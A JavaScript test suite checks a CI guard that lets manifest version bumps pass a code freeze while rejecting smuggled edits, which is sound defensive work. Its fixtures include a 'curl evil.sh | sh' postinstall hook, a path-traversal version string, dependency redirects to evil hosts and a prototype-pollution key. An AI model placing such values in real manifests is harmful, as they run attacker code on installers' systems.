// version-only.test.mjs — #228: a lockstep version bump must not read as a rail edit.
//
// The exemption is deliberately narrow. Every test below that asserts `false` is
// guarding the property that actually matters: a fix which merely weakened the
// guard would satisfy "the release passes" while silently unfreezing real code.

import test from 'node:test';
import assert from 'node:assert/strict';

import { isManifestFile, isVersionOnlyChange } from '../lib/version-only.mjs';

const pkg = (over = {}) => JSON.stringify({
  name: '@adlc/build-gate',
  version: '1.5.0',
  main: 'lib/index.mjs',
  dependencies: { '@adlc/core': '^1.5.0', chalk: '^5.0.0' },
  ...over,
});

// ---------------------------------------------------------------- file scoping

test('only manifest basenames are eligible for the exemption', () => {
  assert.equal(isManifestFile('packages/build-gate/package.json'), true);
  assert.equal(isManifestFile('plugins/adlc-codex/.codex-plugin/plugin.json'), true);
  assert.equal(isManifestFile('.claude-plugin/marketplace.json'), true);

  // Source, config, and lockfiles are never exempt.
  assert.equal(isManifestFile('packages/build-gate/lib/tier.mjs'), false);
  assert.equal(isManifestFile('package-lock.json'), false);
  assert.equal(isManifestFile('.adlc/config.json'), false);
  assert.equal(isManifestFile('tsconfig.json'), false);
});

test('a file merely NAMED like a manifest deeper in a path is still matched by basename only', () => {
  assert.equal(isManifestFile('package.json'), true);
  assert.equal(isManifestFile('docs/package.json.md'), false);
  assert.equal(isManifestFile('scripts/not-package.json'), false);
});

// ------------------------------------------------------------------ the happy path

test('a top-level version bump alone is exempt', () => {
  assert.equal(isVersionOnlyChange(pkg(), pkg({ version: '1.5.1' })), true);
});

test('a version bump plus lockstep @adlc/* dependency repins is exempt', () => {
  const after = pkg({
    version: '1.5.1',
    dependencies: { '@adlc/core': '^1.5.1', chalk: '^5.0.0' },
  });
  assert.equal(isVersionOnlyChange(pkg(), after), true);
});

test('marketplace.json metadata.version and plugins[].version are exempt', () => {
  const before = JSON.stringify({
    name: 'adlc',
    metadata: { description: 'd', version: '1.5.0' },
    plugins: [{ name: 'adlc', version: '1.5.0', source: './plugins/adlc-claude-code' }],
  });
  const after = JSON.stringify({
    name: 'adlc',
    metadata: { description: 'd', version: '1.5.1' },
    plugins: [{ name: 'adlc', version: '1.5.1', source: './plugins/adlc-claude-code' }],
  });
  assert.equal(isVersionOnlyChange(before, after, '.claude-plugin/marketplace.json'), true);
  // Without the manifest kind, only the universal top-level `version` is eligible,
  // so these marketplace-specific paths are refused. Conservative by default.
  assert.equal(isVersionOnlyChange(before, after), false);
});

test('an identical file is exempt (no differing paths at all)', () => {
  assert.equal(isVersionOnlyChange(pkg(), pkg()), true);
});

// ------------------------------------------------- the properties that must hold

test('a behaviour field changing alongside a version bump is NOT exempt', () => {
  const after = pkg({ version: '1.5.1', main: 'lib/evil.mjs' });
  assert.equal(isVersionOnlyChange(pkg(), after), false);
});

test('adding a dependency alongside a version bump is NOT exempt', () => {
  const after = pkg({
    version: '1.5.1',
    dependencies: { '@adlc/core': '^1.5.1', chalk: '^5.0.0', 'evil-pkg': '^1.0.0' },
  });
  assert.equal(isVersionOnlyChange(pkg(), after), false);
});

test('removing a field alongside a version bump is NOT exempt', () => {
  const before = pkg();
  const after = JSON.stringify({
    name: '@adlc/build-gate',
    version: '1.5.1',
    dependencies: { '@adlc/core': '^1.5.1', chalk: '^5.0.0' },
  }); // `main` dropped
  assert.equal(isVersionOnlyChange(before, after), false);
});

test('repinning a NON-@adlc dependency is NOT exempt', () => {
  const after = pkg({
    version: '1.5.1',
    dependencies: { '@adlc/core': '^1.5.1', chalk: '^9.9.9' },
  });
  assert.equal(isVersionOnlyChange(pkg(), after), false);
});

test('adding a scripts block is NOT exempt (arbitrary code execution)', () => {
  const after = pkg({ version: '1.5.1', scripts: { postinstall: 'curl evil.sh | sh' } });
  assert.equal(isVersionOnlyChange(pkg(), after), false);
});

test('changing a plugins[] entry other than its version is NOT exempt', () => {
  const before = JSON.stringify({
    plugins: [{ name: 'adlc', version: '1.5.0', source: './plugins/adlc-claude-code' }],
  });
  const after = JSON.stringify({
    plugins: [{ name: 'adlc', version: '1.5.1', source: './plugins/evil' }],
  });
  assert.equal(isVersionOnlyChange(before, after), false);
});

test('appending a new plugins[] entry is NOT exempt', () => {
  const before = JSON.stringify({ plugins: [{ name: 'adlc', version: '1.5.0' }] });
  const after = JSON.stringify({
    plugins: [{ name: 'adlc', version: '1.5.1' }, { name: 'evil', version: '1.5.1' }],
  });
  assert.equal(isVersionOnlyChange(before, after), false);
});

test('reordering plugins[] is NOT exempt', () => {
  const before = JSON.stringify({
    plugins: [{ name: 'a', version: '1.5.0' }, { name: 'b', version: '1.5.0' }],
  });
  const after = JSON.stringify({
    plugins: [{ name: 'b', version: '1.5.0' }, { name: 'a', version: '1.5.0' }],
  });
  assert.equal(isVersionOnlyChange(before, after), false);
});

// ------------------------------------------------------------ value-shape guards

test('a non-semver value smuggled into `version` is NOT exempt', () => {
  assert.equal(isVersionOnlyChange(pkg(), pkg({ version: '../../etc/passwd' })), false);
  assert.equal(isVersionOnlyChange(pkg(), pkg({ version: '' })), false);
});

test('changing `version` to a non-string is NOT exempt', () => {
  assert.equal(isVersionOnlyChange(pkg(), pkg({ version: 1.51 })), false);
  assert.equal(isVersionOnlyChange(pkg(), pkg({ version: null })), false);
  assert.equal(isVersionOnlyChange(pkg(), pkg({ version: { $gt: '' } })), false);
});

test('an @adlc/* range rewritten to a non-range is NOT exempt', () => {
  const after = pkg({
    version: '1.5.1',
    dependencies: { '@adlc/core': 'file:../evil', chalk: '^5.0.0' },
  });
  assert.equal(isVersionOnlyChange(pkg(), after), false);
});

test('an @adlc/* range rewritten to a git URL is NOT exempt', () => {
  const after = pkg({
    version: '1.5.1',
    dependencies: { '@adlc/core': 'git+ssh://git@evil.test/x.git', chalk: '^5.0.0' },
  });
  assert.equal(isVersionOnlyChange(pkg(), after), false);
});

// -------------------------------------------------------------------- fail closed

test('unparseable JSON on either side is NOT exempt', () => {
  assert.equal(isVersionOnlyChange('{not json', pkg({ version: '1.5.1' })), false);
  assert.equal(isVersionOnlyChange(pkg(), '{not json'), false);
  assert.equal(isVersionOnlyChange('{not json', '{also not json'), false);
});

test('a missing side (added or deleted file) is NOT exempt', () => {
  assert.equal(isVersionOnlyChange(null, pkg()), false);
  assert.equal(isVersionOnlyChange(pkg(), null), false);
  assert.equal(isVersionOnlyChange(undefined, undefined), false);
});

test('a non-object JSON document is NOT exempt', () => {
  assert.equal(isVersionOnlyChange('[]', '[]'), false);
  assert.equal(isVersionOnlyChange('"str"', '"str2"'), false);
  assert.equal(isVersionOnlyChange('null', 'null'), false);
});

test('a prototype-pollution key is NOT exempt', () => {
  const before = '{"version":"1.5.0"}';
  const after = '{"version":"1.5.1","__proto__":{"polluted":true}}';
  assert.equal(isVersionOnlyChange(before, after), false);
  assert.equal({}.polluted, undefined);
});

// ---------------------------------------------- regressions from P5 prosecution
// Each of these caught a CONFIRMED bypass that the original suite missed. The
// mutation calibration is the point: deleting the container-shape record in
// collect() previously failed ZERO of 110 tests.

test('reordering object keys is NOT exempt — conditional exports are order-sensitive', () => {
  // Node resolves `exports` first-match-wins, so this reorder changes which
  // module loads while every leaf value stays identical.
  const before = JSON.stringify({ version: '1.5.0', exports: { node: './node.js', default: './browser.js' } });
  const after  = JSON.stringify({ version: '1.5.1', exports: { default: './browser.js', node: './node.js' } });
  assert.equal(isVersionOnlyChange(before, after), false);
});

test('swapping an array for an object with numeric keys is NOT exempt', () => {
  const before = JSON.stringify({ plugins: [{ name: 'a', source: './safe' }] });
  const after  = JSON.stringify({ plugins: { 0: { name: 'a', source: './safe' } } });
  assert.equal(isVersionOnlyChange(before, after), false);
});

test('swapping an object for an array is NOT exempt', () => {
  const before = JSON.stringify({ version: '1.5.0', config: { 0: 'x' } });
  const after  = JSON.stringify({ version: '1.5.1', config: ['x'] });
  assert.equal(isVersionOnlyChange(before, after), false);
});

test('adding an EMPTY container is NOT exempt (no leaf differs — shape must catch it)', () => {
  assert.equal(isVersionOnlyChange('{"version":"1.5.0"}', '{"version":"1.5.1","scripts":{}}'), false);
  assert.equal(isVersionOnlyChange('{"version":"1.5.0"}', '{"version":"1.5.1","workspaces":[]}'), false);
});

test('removing an EMPTY container is NOT exempt', () => {
  assert.equal(isVersionOnlyChange('{"version":"1.5.0","scripts":{}}', '{"version":"1.5.1"}'), false);
});

test('a prerelease containing 0 is handled on both sides', () => {
  // Pins the `[0-9A-Za-z.-]` prerelease charclass: a mutant narrowing it to
  // `[1-9…]` previously survived.
  assert.equal(isVersionOnlyChange('{"version":"1.5.0-rc.0"}', '{"version":"1.5.1-rc.0"}'), true);
  assert.equal(isVersionOnlyChange('{"version":"1.5.0"}', '{"version":"1.5.1-rc.0"}'), true);
});

test('isManifestFile guard clause rejects empty and non-string input', () => {
  assert.equal(isManifestFile(''), false);
  assert.equal(isManifestFile(null), false);
  assert.equal(isManifestFile(undefined), false);
  assert.equal(isManifestFile(42), false);
});

test('a pathologically nested manifest denies rather than exhausting the stack', () => {
  let deep = '{"leaf":1}';
  for (let i = 0; i < 5000; i++) deep = `{"n":${deep}}`;
  const before = `{"version":"1.5.0","x":${deep}}`;
  const after = `{"version":"1.5.1","x":${deep}}`;
  assert.equal(isVersionOnlyChange(before, after), false);
});

test('no immutable trust root is eligible for the exemption', () => {
  // scripts/rails-guard-ci.mjs passes these to rails-guard as rails. If one ever
  // gained a manifest basename, the exemption would apply to a trust root.
  for (const root of [
    '.adlc/config.json', '.adlc/tickets/.store.json', '.adlc/admin.pub',
    '.github/workflows/adlc-rails-guard.yml', 'CODEOWNERS', '.github/CODEOWNERS',
    'docs/CODEOWNERS', 'docs/ci/rails-guard.yml', 'scripts/rails-guard-ci.mjs',
    'scripts/test/rails-guard-workflow-hashes.json',
  ]) {
    assert.equal(isManifestFile(root), false, `${root} must not be exemptible`);
  }
});

// ------------------------------------- regressions from CROSS-MODEL prosecution
// A second, independent provider rejected the first fix. These pin what it found:
// the same-model pass had verified the mechanisms it knew about and missed these
// entirely, which is the whole argument for the cross-model tier.

test('a range npm reads as a dist-tag is NOT exempt', () => {
  // `1.2.3-a..b` has an EMPTY prerelease identifier. It looked like semver to the
  // old regex, but npm-package-arg classifies it as type=tag — so it resolves to
  // whatever that tag points at. A dependency redirection wearing a version.
  const before = '{"version":"1.0.0","dependencies":{"@adlc/core":"1.0.0"}}';
  const after  = '{"version":"1.0.1","dependencies":{"@adlc/core":"1.2.3-a..b"}}';
  assert.equal(isVersionOnlyChange(before, after, 'package.json'), false);
});

test('non-semver forms the loose regex accepted are NOT exempt', () => {
  const mk = (range) => `{"version":"1.0.1","dependencies":{"@adlc/core":"${range}"}}`;
  const before = '{"version":"1.0.0","dependencies":{"@adlc/core":"1.0.0"}}';
  for (const bad of ['01.2.3', '1.02.3', '1.2.3-', '1.2.3+', '1.2.3-alpha..1', '1.2.3+build..1']) {
    assert.equal(isVersionOnlyChange(before, mk(bad), 'package.json'), false, `${bad} must not be exempt`);
  }
});

test('LOCKSTEP is enforced — a repin must target the manifest own new version', () => {
  const mk = (v, dep) => `{"version":"${v}","dependencies":{"@adlc/core":"${dep}"}}`;
  // The real release shape: both move together.
  assert.equal(isVersionOnlyChange(mk('1.0.0', '^1.0.0'), mk('1.0.1', '^1.0.1'), 'package.json'), true);
  // A dependency redirected to an unrelated major, with NO version change at all.
  assert.equal(isVersionOnlyChange(mk('1.0.0', '^1.0.0'), mk('1.0.0', '^9.0.0'), 'package.json'), false);
  // Version moves, but the repin targets something else entirely.
  assert.equal(isVersionOnlyChange(mk('1.0.0', '^1.0.0'), mk('1.0.1', '^9.9.9'), 'package.json'), false);
});

test('EXACT pins repin in lockstep too — the release shape in this repo', () => {
  // 68 internal deps here are exact pins, not carets. The e2e fixture used a
  // caret, so a caret-only RANGE mutant survived the whole suite.
  const mk = (v, dep) => `{"version":"${v}","dependencies":{"@adlc/core":"${dep}"}}`;
  assert.equal(isVersionOnlyChange(mk('1.0.0', '1.0.0'), mk('1.0.1', '1.0.1'), 'package.json'), true);
  assert.equal(isVersionOnlyChange(mk('1.0.0', '~1.0.0'), mk('1.0.1', '~1.0.1'), 'package.json'), true);
  assert.equal(isVersionOnlyChange(mk('1.0.0', '1.0.0'), mk('1.0.1', '9.9.9'), 'package.json'), false);
});

test('every dependency field is covered, not just `dependencies`', () => {
  // Deleting devDependencies/peerDependencies/optionalDependencies from DEP_FIELDS
  // previously survived the entire suite.
  for (const field of ['dependencies', 'devDependencies', 'peerDependencies', 'optionalDependencies']) {
    const mk = (v) => `{"version":"${v}","${field}":{"@adlc/core":"^${v}"}}`;
    assert.equal(isVersionOnlyChange(mk('1.0.0'), mk('1.0.1'), 'package.json'), true, `${field} lockstep`);
    const bad = `{"version":"1.0.1","${field}":{"@adlc/core":"^9.0.0"}}`;
    assert.equal(isVersionOnlyChange(mk('1.0.0'), bad, 'package.json'), false, `${field} redirect`);
  }
});

test('the BASELINE side is validated too, not only the new value', () => {
  // Removing baseline-side validation previously survived the suite.
  const before = '{"version":"not-a-version"}';
  const after  = '{"version":"1.0.1"}';
  assert.equal(isVersionOnlyChange(before, after, 'package.json'), false);
});

test('an invalid @adlc/ key is NOT a lockstep repin', () => {
  // `startsWith('@adlc/')` accepted names npm rejects outright.
  const before = '{"version":"1.0.0","dependencies":{"@adlc/":"1.0.0"}}';
  const after  = '{"version":"1.0.1","dependencies":{"@adlc/":"1.0.1"}}';
  assert.equal(isVersionOnlyChange(before, after, 'package.json'), false);
  const b2 = '{"version":"1.0.0","dependencies":{"@adlc/foo/bar":"1.0.0"}}';
  const a2 = '{"version":"1.0.1","dependencies":{"@adlc/foo/bar":"1.0.1"}}';
  assert.equal(isVersionOnlyChange(b2, a2, 'package.json'), false);
});

test('marketplace-only version paths are NOT accepted inside a package.json', () => {
  const before = '{"version":"1.0.0","metadata":{"version":"1.0.0"}}';
  const after  = '{"version":"1.0.1","metadata":{"version":"9.9.9"}}';
  assert.equal(isVersionOnlyChange(before, after, 'package.json'), false);
  // The same edit IS eligible in a marketplace manifest.
  assert.equal(isVersionOnlyChange(before, after, '.claude-plugin/marketplace.json'), true);
});

test('leaf values that JSON.stringify collides on are NOT exempt', () => {
  // JSON.parse('1e400') === Infinity, and JSON.stringify(Infinity) === 'null',
  // so `1e400` and `null` encoded identically and compared equal.
  assert.equal(isVersionOnlyChange('{"version":"1.0.0","x":1e400}', '{"version":"1.0.1","x":null}', 'package.json'), false);
  // JSON.stringify(-0) === '0'
  assert.equal(isVersionOnlyChange('{"version":"1.0.0","x":0}', '{"version":"1.0.1","x":-0}', 'package.json'), false);
  // string "1" vs number 1 must not collide either
  assert.equal(isVersionOnlyChange('{"version":"1.0.0","x":1}', '{"version":"1.0.1","x":"1"}', 'package.json'), false);
});
